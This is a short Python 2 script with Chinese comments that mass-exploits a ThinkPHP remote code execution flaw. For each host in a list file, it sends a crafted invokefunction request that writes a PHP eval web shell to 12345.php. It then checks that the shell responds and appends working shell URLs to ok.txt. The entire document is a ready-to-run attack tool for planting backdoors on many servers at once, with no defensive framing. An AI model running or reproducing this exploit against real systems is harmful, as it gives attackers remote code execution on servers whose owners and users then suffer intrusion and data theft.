#!/usr/bin/python
# -*- coding: utf-8 -*-
#漏洞连接：https://paper.seebug.org/770/
#url连接别加http头
#这个脚本是网上看见修改的

import requests
import time

a="/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php @eval($_POST[a]);?>"

c=list(open('url.txt'))

for url in c:
 try:
   exp="http://"+url.strip()
   print exp
   exp=exp+a
   m=requests.get(url=exp)
   url2="http://"+url.strip()+"/12345.php"
   print url2
   time.sleep(2)
   n=requests.get(url=url2)
   if n.status_code==200:
     print("shell地址是"+url2)
     f=open("ok.txt","a")
     f.writelines(url2)
     f.close()
   else:
     print("不存在漏洞")
 except Exception:
     print("不存在漏洞")